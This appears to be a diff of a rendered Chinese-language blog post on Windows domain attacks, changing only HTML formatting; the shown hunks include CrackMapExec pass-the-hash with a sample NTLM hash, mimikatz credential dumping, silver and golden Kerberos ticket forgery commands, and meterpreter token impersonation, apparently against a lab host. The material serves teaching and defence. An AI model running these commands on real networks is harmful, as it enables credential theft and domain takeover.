@@ -265,14 +265,14 @@
 <li>Metasploit</li>
 </ul>
 <p>使用CrackMapExec实现Hash传递：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">root<span style="color:#960050;background-color:#1e0010">@</span>kali:<span style="color:#f92672">~/</span>cache<span style="color:#960050;background-color:#1e0010">#</span> cme smb <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#f92672">-</span>u administrator <span style="color:#f92672">-</span>H dab7de8feeb5ecac65faf9fdc6cac3a9 <span style="color:#f92672">-</span>x whoami
-SMB <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#ae81ff">445</span> LIYINGZHEA30B
-[<span style="color:#f92672">*</span>] Windows <span style="color:#ae81ff">7</span> Ultimate <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 (name:LIYINGZHEA30B)
-(domain:PAYLOADS) (signing:False) (SMBv1:True)
-SMB <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#ae81ff">445</span> LIYINGZHEA30B
-[<span style="color:#f92672">+</span>] PAYLOADS<span style="color:#960050;background-color:#1e0010">\</span>administrator dab7de8feeb5ecac65faf9fdc6cac3a9
-(Pwn3d<span style="color:#f92672">!</span>)SMB <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#ae81ff">445</span> LIYINGZHEA30B [<span style="color:#f92672">+</span>] Executed command
-</code></pre></div><h2 id="0x02-kerberos域认证">0x02 Kerberos域认证</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>kali:<span style="color:#f92672">~/</span>cache<span style="color:#960050;background-color:#1e0010">#</span> cme smb <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#f92672">-</span>u administrator <span style="color:#f92672">-</span>H dab7de8feeb5ecac65faf9fdc6cac3a9 <span style="color:#f92672">-</span>x whoami
+</span></span><span style="display:flex;"><span>SMB <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#ae81ff">445</span> LIYINGZHEA30B
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Windows <span style="color:#ae81ff">7</span> Ultimate <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 (name:LIYINGZHEA30B)
+</span></span><span style="display:flex;"><span>(domain:PAYLOADS) (signing:False) (SMBv1:True)
+</span></span><span style="display:flex;"><span>SMB <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#ae81ff">445</span> LIYINGZHEA30B
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] PAYLOADS<span style="color:#960050;background-color:#1e0010">\</span>administrator dab7de8feeb5ecac65faf9fdc6cac3a9
+</span></span><span style="display:flex;"><span>(Pwn3d<span style="color:#f92672">!</span>)SMB <span style="color:#ae81ff">192.168.3.5</span> <span style="color:#ae81ff">445</span> LIYINGZHEA30B [<span style="color:#f92672">+</span>] Executed command
+</span></span></code></pre></div><h2 id="0x02-kerberos域认证">0x02 Kerberos域认证</h2>
 <h3 id="active-directory活动目录概念">Active Directory(活动目录)概念</h3>
 <p>Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务，当然，这个不在我们的讨论范围。</p>
 <p>活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。</p>
@@ -369,9 +369,9 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 所以，一切凭据都来源于Server Hash。</strong></p>
 <h3 id="伪造白银票据silver-tickets">伪造白银票据(Silver Tickets)</h3>
 <p>首先需要导出Server Hash：</p>
-<pre tabindex="0"><code>C:\files&gt;mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt
+<pre tabindex="0"><code>C:\files&gt;mimikatz.exe &#34;privilege::debug” &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34; &gt; log.txt
 </code></pre><p>伪造票据:</p>
-<pre tabindex="0"><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit
+<pre tabindex="0"><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&#34; exit
 </code></pre><p>Other：</p>
 <ul>
 <li>kerberos::list #列出票据</li>
@@ -451,7 +451,7 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/39bd5896-4f5f-11ec-b64d-00d861bf4abb.png" alt="0x010.png"></p>
 <h3 id="黄金票据golden-tickets---伪造">黄金票据(Golden Tickets) - 伪造</h3>
 <p>伪造票据:</p>
-<pre tabindex="0"><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit
+<pre tabindex="0"><code>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&#34; exit
 </code></pre><h3 id="黄金票据golden-tickets---演示">黄金票据(Golden Tickets) - 演示</h3>
 <video src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3a159088-4f5f-11ec-a792-00d861bf4abb.mp4" controls="controls" width="500px">
 哎呀~ 换个浏览器试试吧！
@@ -519,7 +519,7 @@ TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据�
 <pre tabindex="0"><code>meterpreter &gt; getsystem
 meterpreter &gt; load incognito meterpreter &gt; list_tokens –u
 Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7
-meterpreter &gt; impersonate_token &quot;PAYLOADS\\Administrator”
+meterpreter &gt; impersonate_token &#34;PAYLOADS\\Administrator”
 [+] Delegation token available
 [+] Successfully impersonated user PAYLOADS\Administrator
 </code></pre><h3 id="windows-access-token令牌假冒防御">Windows Access Token令牌假冒防御</h3>
